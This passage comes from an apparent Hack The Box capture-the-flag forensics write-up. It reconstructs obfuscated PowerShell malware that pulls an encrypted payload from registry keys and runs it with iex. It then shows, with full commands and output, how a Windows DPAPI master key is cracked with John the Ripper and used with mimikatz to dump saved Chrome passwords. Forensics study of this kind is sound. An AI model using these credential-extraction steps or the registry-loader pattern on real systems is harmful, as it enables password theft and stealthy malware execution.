+<span style="color:#a6e22e">        [int]</span><span style="color:#960050;background-color:#1e0010">$</span>t = (<span style="color:#960050;background-color:#1e0010">$</span>s[<span style="color:#960050;background-color:#1e0010">$</span>i] + <span style="color:#960050;background-color:#1e0010">$</span>s[<span style="color:#960050;background-color:#1e0010">$</span>j]) % <span style="color:#ae81ff">256</span>;
+        <span style="color:#960050;background-color:#1e0010">$</span>buffer[<span style="color:#960050;background-color:#1e0010">$</span>x] = <span style="color:#960050;background-color:#1e0010">$</span>buffer[<span style="color:#960050;background-color:#1e0010">$</span>x] -bxor <span style="color:#960050;background-color:#1e0010">$</span>s[<span style="color:#960050;background-color:#1e0010">$</span>t];
+    }
+ 
+    <span style="color:#66d9ef">return</span> <span style="color:#960050;background-color:#1e0010">$</span>buffer
+}
+
+function HexToBin {
+    param(
+<span style="color:#a6e22e">    [Parameter(
+</span><span style="color:#a6e22e">        Position=0, 
+</span><span style="color:#a6e22e">        Mandatory=$true, 
+</span><span style="color:#a6e22e">        ValueFromPipeline=$true)
+</span><span style="color:#a6e22e">    ]</span>   
+<span style="color:#a6e22e">    [string]</span><span style="color:#960050;background-color:#1e0010">$</span>s)
+    <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#66d9ef">return</span> = <span style="color:#960050;background-color:#1e0010">@</span>()
+    
+    <span style="color:#66d9ef">for</span> (<span style="color:#960050;background-color:#1e0010">$</span>i = <span style="color:#ae81ff">0</span>; <span style="color:#960050;background-color:#1e0010">$</span>i -lt <span style="color:#960050;background-color:#1e0010">$</span>s.Length ; <span style="color:#960050;background-color:#1e0010">$</span>i += <span style="color:#ae81ff">2</span>)
+    {
+        <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#66d9ef">return</span> += [Byte]::Parse(<span style="color:#960050;background-color:#1e0010">$</span>s.Substring(<span style="color:#960050;background-color:#1e0010">$</span>i, <span style="color:#ae81ff">2</span>), [System.Globalization.NumberStyles]::HexNumber)
+    }
+    
+    Write-Output <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#66d9ef">return</span>
+}
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">[Byte[]</span>]<span style="color:#960050;background-color:#1e0010">$</span>key = <span style="color:#960050;background-color:#1e0010">$</span>enc.GetBytes(<span style="color:#e6db74">&#34;Q0mmpr4B5rvZi3pS&#34;</span>)
+<span style="color:#960050;background-color:#1e0010">$</span>encrypted1 = (Get-ItemProperty -Path HKCU:<span style="color:#960050;background-color:#1e0010">\</span>SOFTWARE<span style="color:#960050;background-color:#1e0010">\</span>ZYb78P4s).t3RBka5tL
+<span style="color:#960050;background-color:#1e0010">$</span>encrypted2 = (Get-ItemProperty -Path HKCU:<span style="color:#960050;background-color:#1e0010">\</span>SOFTWARE<span style="color:#960050;background-color:#1e0010">\</span>BjqAtIen).uLltjjW
+<span style="color:#960050;background-color:#1e0010">$</span>encrypted3 = (Get-ItemProperty -Path HKCU:<span style="color:#960050;background-color:#1e0010">\</span>SOFTWARE<span style="color:#960050;background-color:#1e0010">\</span>AppDataLow<span style="color:#960050;background-color:#1e0010">\</span>t03A1Stq).uY4S39Da
+<span style="color:#960050;background-color:#1e0010">$</span>encrypted4 = (Get-ItemProperty -Path HKCU:<span style="color:#960050;background-color:#1e0010">\</span>SOFTWARE<span style="color:#960050;background-color:#1e0010">\</span>Google<span style="color:#960050;background-color:#1e0010">\</span>Nv50zeG).Kb19fyhl
+<span style="color:#960050;background-color:#1e0010">$</span>encrypted5 = (Get-ItemProperty -Path HKCU:<span style="color:#960050;background-color:#1e0010">\</span>AppEvents<span style="color:#960050;background-color:#1e0010">\</span>Jx66ZG0O).jH54NW8C
+<span style="color:#960050;background-color:#1e0010">$</span>encrypted = <span style="color:#e6db74">&#34;$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)&#34;</span>
+<span style="color:#960050;background-color:#1e0010">$</span>enc = [System.Text.Encoding]::ASCII
+<span style="color:#a6e22e">[Byte[]</span>]<span style="color:#960050;background-color:#1e0010">$</span>data = HexToBin <span style="color:#960050;background-color:#1e0010">$</span>encrypted
+<span style="color:#960050;background-color:#1e0010">$</span>DecryptedBytes = encr <span style="color:#960050;background-color:#1e0010">$</span>data <span style="color:#960050;background-color:#1e0010">$</span>key
+<span style="color:#960050;background-color:#1e0010">$</span>DecryptedString = <span style="color:#960050;background-color:#1e0010">$</span>enc.GetString(<span style="color:#960050;background-color:#1e0010">$</span>DecryptedBytes)
+<span style="color:#960050;background-color:#1e0010">$</span>DecryptedString|iex
+</code></pre></div><p>The things that we need to do are:</p>
+<ul>
+<li>Extract the value of $encrypted1..5 in the registry ; and replace it in the script</li>
+<li>Replace $enc declaration before $key declaration</li>
+</ul>
+<p>Final script :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...
+
+<span style="color:#960050;background-color:#1e0010">$</span>enc = [System.Text.Encoding]::ASCII
+<span style="color:#a6e22e">[Byte[]</span>]<span style="color:#960050;background-color:#1e0010">$</span>key = <span style="color:#960050;background-color:#1e0010">$</span>enc.GetBytes(<span style="color:#e6db74">&#34;Q0mmpr4B5rvZi3pS&#34;</span>)
+<span style="color:#960050;background-color:#1e0010">$</span>encrypted1 = <span style="color:#e6db74">&#34;F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39&#34;</span>
+<span style="color:#960050;background-color:#1e0010">$</span>encrypted2 = <span style="color:#e6db74">&#34;CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1&#34;</span>
+<span style="color:#960050;background-color:#1e0010">$</span>encrypted3 = <span style="color:#e6db74">&#34;C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D&#34;</span>
+<span style="color:#960050;background-color:#1e0010">$</span>encrypted4 = <span style="color:#e6db74">&#34;D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1&#34;</span>
+<span style="color:#960050;background-color:#1e0010">$</span>encrypted5 = <span style="color:#e6db74">&#34;84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB&#34;</span>
+<span style="color:#960050;background-color:#1e0010">$</span>encrypted = <span style="color:#e6db74">&#34;$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)&#34;</span>
+<span style="color:#a6e22e">[Byte[]</span>]<span style="color:#960050;background-color:#1e0010">$</span>data = HexToBin <span style="color:#960050;background-color:#1e0010">$</span>encrypted
+<span style="color:#960050;background-color:#1e0010">$</span>DecryptedBytes = encr <span style="color:#960050;background-color:#1e0010">$</span>data <span style="color:#960050;background-color:#1e0010">$</span>key
+<span style="color:#960050;background-color:#1e0010">$</span>DecryptedString = <span style="color:#960050;background-color:#1e0010">$</span>enc.GetString(<span style="color:#960050;background-color:#1e0010">$</span>DecryptedBytes)
+<span style="color:#960050;background-color:#1e0010">$</span>DecryptedString|iex
+</code></pre></div><p>Then we execute it :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./script.ps1
+...
+$flag<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}&#34;</span>
+</code></pre></div><h2 id="seized">Seized<a hidden class="anchor" aria-hidden="true" href="#seized">#</a></h2>
+<p>This challenge is about finding ransomware operators credentials in the AppData folder :</p>
+<p><img loading="lazy" src="https://luhko.github.io/cyber2022_data/Untitled%202.png" alt="Untitled"  />
+</p>
+<p>After some researches about potential interesting location, I found the Google one. This folder contains data about Google Chrome and 2 particular files are interesting :</p>
+<ul>
+<li><code>AppData\Local\Google\Chrome\User Data\Local State</code>
+<ul>
+<li>Contains the key that encrypts the user’s passwords. This key is encrypted with the Master Key from the system, generated from various parameters, including the user’s password.</li>
+</ul>
+</li>
+<li><code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code>
+<ul>
+<li>This file is a database that contains login information : website, login, password. Passwords may (or not) be encrypted. In our case, there is the login <strong><a href="mailto:ransomoperator@draeglocker.com">ransomoperator@draeglocker.com</a></strong> and the associated password is encrypted.</li>
+</ul>
+</li>
+</ul>
+<p><img loading="lazy" src="https://luhko.github.io/cyber2022_data/Untitled%203.png" alt="(https://www.alertra.com/blog/decrypting-browser-passwords-other-secrets)"  />
+</p>
+<p>Let’s find out if we can find the master key file. It should be located in <code>AppData\Roaming\Microsoft\Protect\{SID}</code> :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$Get-ChildItem -Hidden AppData\Roaming\Microsoft\Protect\S-1-5-21-3702016591-3723034727-1691771208-1002\
+
+    Répertoire<span style="color:#960050;background-color:#1e0010">:</span>
+    AppData\Roaming\Microsoft\Protect\S-1-5-21-3702016591-3723034727-1691771208-1002
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-        22/03/2022     15<span style="color:#960050;background-color:#1e0010">:</span>06            468 865be7a6-863c-4d73-ac9f-233f8734089d
+-a-hs-        22/03/2022     15<span style="color:#960050;background-color:#1e0010">:</span>06             24 Preferred
+</code></pre></div><p>There is a master key file. Since it is encrypted, we need to decrypt it to extract the master key. The first thing to do is to convert the data to a crackable format :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$ python DPAPImk2john.py -mk 865be7a6-863c-4d73-ac9f-233f8734089d -S S-1-5-21-3702016591-3723034727-1691771208-1002 -c local
+$DPAPImk$2*1*S-1-5-21-3702016591-3723034727-1691771208-1002*aes256*sha512*8000*a17612a0ebdfc203316e0c18c04729f1*288*7dd629ab5efc8442596e5fbe5b9fc695bf8a51384dfacabd7a1a214245f894383540eb3e00c009bd76f836ae991cef540d74c0a6a31527b7e1df4b0d55a6760e41271f3dcaad163a6fb648f898281424728485335676c0374735cab055088e66bc55a72fc2087d64038d1d716f5efd4bdd4ce19971d082db004a36de70c351a2bd9b6ba9cf8f89a7481150b26f5808bc
+</code></pre></div><p>Let’s give our hash to john :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@jtr:/hashes# ../jtr/run/john dump --wordlist<span style="color:#f92672">=</span>rockyou.txt
+Using default input encoding: UTF-8
+Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>DPAPImk, DPAPI masterkey file v1 and v2 <span style="color:#f92672">[</span>SHA1/MD4 PBKDF2-<span style="color:#f92672">(</span>SHA1/SHA512<span style="color:#f92672">)</span>-DPAPI-variant 3DES/AES256 256/256 AVX2 8x<span style="color:#f92672">])</span>
+Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">8000</span> <span style="color:#66d9ef">for</span> all loaded hashes
+Will run <span style="color:#ae81ff">16</span> OpenMP threads
+Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+ransom           <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>
+1g 0:00:00:05 DONE <span style="color:#f92672">(</span>2022-05-18 17:17<span style="color:#f92672">)</span> 0.1692g/s 5457p/s 5457c/s 5457C/s 210392..bheibhie
+Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div><p>Bingo ! We got the password <code>ransom</code></p>
+<p>Now, we want to decrypt the master key using the <strong>holy</strong> mimikatz :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">mimikatz <span style="color:#75715e"># dpapi::masterkey /in:&#34;AppData\Roaming\Microsoft\Protect\S-1-5-21-3702016591-3723034727-1691771208-1002\865be7a6-863c-4d73-ac9f-233f8734089d&#34; /sid:S-1-5-21-3702016591-3723034727-1691771208-1002 /password:ransom /protected</span>
+**MASTERKEYS**
+  dwVersion          <span style="color:#960050;background-color:#1e0010">:</span> 00000002 - 2
+  szGuid             <span style="color:#960050;background-color:#1e0010">:</span> {865be7a6-863c-4d73-ac9f-233f8734089d}
+  dwFlags            <span style="color:#960050;background-color:#1e0010">:</span> 00000005 - 5
+  dwMasterKeyLen     <span style="color:#960050;background-color:#1e0010">:</span> 000000b0 - 176
+  dwBackupKeyLen     <span style="color:#960050;background-color:#1e0010">:</span> 00000090 - 144
+  dwCredHistLen      <span style="color:#960050;background-color:#1e0010">:</span> 00000014 - 20
+  dwDomainKeyLen     <span style="color:#960050;background-color:#1e0010">:</span> 00000000 - 0
+<span style="color:#66d9ef">[masterkey]</span>
+  **MASTERKEY**
+    dwVersion        <span style="color:#960050;background-color:#1e0010">:</span> 00000002 - 2
+    salt             <span style="color:#960050;background-color:#1e0010">:</span> a17612a0ebdfc203316e0c18c04729f1
+    rounds           <span style="color:#960050;background-color:#1e0010">:</span> 00001f40 - 8000
+    algHash          <span style="color:#960050;background-color:#1e0010">:</span> 0000800e - 32782 (CALG_SHA_512)
+    algCrypt         <span style="color:#960050;background-color:#1e0010">:</span> 00006610 - 26128 (CALG_AES_256)
+    pbKey            <span style="color:#960050;background-color:#1e0010">:</span> 7dd629ab5efc8442596e5fbe5b9fc695bf8a51384dfacabd7a1a214245f894383540eb3e00c009bd76f836ae991cef540d74c0a6a31527b7e1df4b0d55a6760e41271f3dcaad163a6fb648f898281424728485335676c0374735cab055088e66bc55a72fc2087d64038d1d716f5efd4bdd4ce19971d082db004a36de70c351a2bd9b6ba9cf8f89a7481150b26f5808bc
+
+<span style="color:#66d9ef">[backupkey]</span>
+  **MASTERKEY**
+    dwVersion        <span style="color:#960050;background-color:#1e0010">:</span> 00000002 - 2
+    salt             <span style="color:#960050;background-color:#1e0010">:</span> 9e4ad8f433383f8543cdc7f97d94cc46
+    rounds           <span style="color:#960050;background-color:#1e0010">:</span> 00001f40 - 8000
+    algHash          <span style="color:#960050;background-color:#1e0010">:</span> 0000800e - 32782 (CALG_SHA_512)
+    algCrypt         <span style="color:#960050;background-color:#1e0010">:</span> 00006610 - 26128 (CALG_AES_256)
+    pbKey            <span style="color:#960050;background-color:#1e0010">:</span> 32bafd010af552fd03f566b9e411cc6ef7860c8e33c4feca3cc3c7fe2e87e09bb477111b88a1930650c8c0a10ea1f9314435bca867b3f905127d563009c8f43ed9def056ac533e51f8aa90104d98ad591a156dffe6776c53ffd4df22cd639c83162396244aff646226e14681dddbf749
+
+<span style="color:#66d9ef">[credhist]</span>
+  **CREDHIST INFO**
+    dwVersion        <span style="color:#960050;background-color:#1e0010">:</span> 00000003 - 3
+    guid             <span style="color:#960050;background-color:#1e0010">:</span> {a2a87803-e77b-44b9-8ca2-01526cb531e4}
+
+<span style="color:#66d9ef">[masterkey]</span> with password<span style="color:#960050;background-color:#1e0010">:</span> ransom (protected user)
+  key <span style="color:#960050;background-color:#1e0010">:</span> 138f089556f32b87e53c5337c47f5f34746162db7fe9ef47f13a92c74897bf67e890bcf9c6a1d1f4cc5454f13fcecc1f9f910afb8e2441d8d3dbc3997794c630
+  sha1<span style="color:#960050;background-color:#1e0010">:</span> a765463192eb14812650e62d6b0150a262d1864e
+</code></pre></div><p>Then we can use the master key to decrypt the password and get the flag !</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">mimikatz <span style="color:#75715e"># dpapi::chrome /in:&#34;AppData\Local\Google\Chrome\User Data\Default\Login Data&#34; /unprotect /masterkey:138f089556f32b87e53c5337c47f5f34746162db7fe9ef47f13a92c74897bf67e890bcf9c6a1d1f4cc5454f13fcecc1f9f910afb8e2441d8d3dbc3997794c630</span>
+&gt; Encrypted Key found <span style="color:#66d9ef">in</span> local state file
+&gt; Encrypted Key seems to be protected by DPAPI
+ * using CryptUnprotectData API
+ * masterkey     <span style="color:#960050;background-color:#1e0010">:</span> 138f089556f32b87e53c5337c47f5f34746162db7fe9ef47f13a92c74897bf67e890bcf9c6a1d1f4cc5454f13fcecc1f9f910afb8e2441d8d3dbc3997794c630
+&gt; AES Key is<span style="color:#960050;background-color:#1e0010">:</span> 46befddb52a607c5e775b7a930b6b6c4f3a35e7c1c30aaa4ce0d2277fbca6c19
+
+URL     <span style="color:#960050;background-color:#1e0010">:</span> https<span style="color:#960050;background-color:#1e0010">:</span>//windowsliveupdater.com/ ( https<span style="color:#960050;background-color:#1e0010">:</span>//windowsliveupdater.com/ )
+Username<span style="color:#960050;background-color:#1e0010">:</span> ransomoperator@draeglocker.com
+ * using BCrypt with AES-256-GCM
+Password<span style="color:#960050;background-color:#1e0010">:</span> HTB{Br0ws3rs_C4nt_s4v3_y0u_n0w}
+</code></pre></div><h3 id="related-sources">Related sources<a hidden class="anchor" aria-hidden="true" href="#related-sources">#</a></h3>
+<p><a href="https://www.alertra.com/blog/decrypting-browser-passwords-other-secrets">https://www.alertra.com/blog/decrypting-browser-passwords-other-secrets</a></p>
+<p><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords</a></p>
+<p><a href="https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf">https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf</a></p>
+<p><a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++">https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://luhko.github.io/">Luhko</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
